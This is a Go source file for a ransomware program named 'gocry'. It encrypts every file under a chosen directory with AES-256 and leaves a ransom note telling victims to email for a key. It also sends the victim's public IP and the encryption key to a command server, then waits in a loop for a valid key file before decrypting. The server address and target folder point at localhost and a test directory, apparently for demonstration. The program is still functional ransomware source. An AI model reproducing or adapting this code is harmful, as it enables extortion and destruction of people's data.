package main

import (
	"log"
	"os"
	"strings"
	"time"

	"github.com/awnumar/memguard"
	"github.com/nireo/gocry/config"
	"github.com/nireo/gocry/crypt"
	"github.com/nireo/gocry/ransomware"
	"golang.org/x/exp/errors/fmt"
)

var rootToEncrypt string = "./test"

const message string = `
Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
Do not use any decryption software or change the files, otherwise they might be lost forever.

How to decrypt:
1. Send email to example@example.com containing your unique ID, then you'll  receive a key.
2. Place the correct key into a file called key.txt in the root directory.
3. After this all your files will be decrypted.

Your unique ID is: %s
`

const serverPath = "http://localhost:8080"
const encryptionScheme crypt.EncryptionScheme = crypt.AES256

func handleDecryptionProcess(rw *ransomware.Ransomware) {
	if rw.CheckIfValidMemSafeKey() {
		fmt.Println("found a valid key.")

		// remove the generated files
		rw.RemoveRansomFile()
		rw.RemoveKeyFile()

		if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
			log.Fatalf("error decrypting all files: %s", err)
		}

		fmt.Println("Thank you for your cooperation!")
	}

	fmt.Println("key is not valid, try again.")
	os.Exit(0)
}

func main() {
	// safely terminate in case of an interrupt signal
	memguard.CatchInterrupt()
	defer memguard.Purge()

	// validate the root path just incase
	if strings.HasSuffix(rootToEncrypt, "/") {
		rootToEncrypt = rootToEncrypt[:len(rootToEncrypt)-1]
	}
	config.CreateConfiguration(serverPath, rootToEncrypt, message)

	rw, err := ransomware.NewRansomware()
	if err != nil {
		log.Fatalf("error creating a ransomware instance: %s", err)
	}

	if err := rw.CheckIfActiveRansom(); err != nil {
		handleDecryptionProcess(rw)
	}

	crypt.EncryptRoot(rw.RootDir, rw.MemguardKey)
	if err := rw.WriteMemSafeKey(); err != nil {
		log.Fatal(err)
	}

	rw.Data.GetPublicIP()
	rw.Data.SendToServer(config.GetConfig().ServerPath + "/register")
	if err := rw.CreateRansomInfoFile(message); err != nil {
		log.Fatal(err)
	}

	if err := rw.SendKeyToServer(); err != nil {
		log.Fatal(err)
	}

	// Start an infnite loop which checks key validity. We start in a goroutine, since
	// we want the user to be able to interact with the ransomware.
	for {
		fmt.Println()
		fmt.Println("Checking key file...")

		if ok := rw.CheckIfValidMemSafeKey(); ok {
			// remove the generated files
			rw.RemoveRansomFile()
			rw.RemoveKeyFile()

			if err := crypt.DecryptRoot(rw.RootDir, rw.MemguardKey); err != nil {
				log.Fatalf("error decrypting all files: %s", err)
			}

			fmt.Println("Thank you for your cooperation!")

			// Stop the whole program
			os.Exit(0)
		}

		fmt.Println("Key did not match, checking again in 1 minute(s)...")
		time.Sleep(time.Second * 20)
	}
}
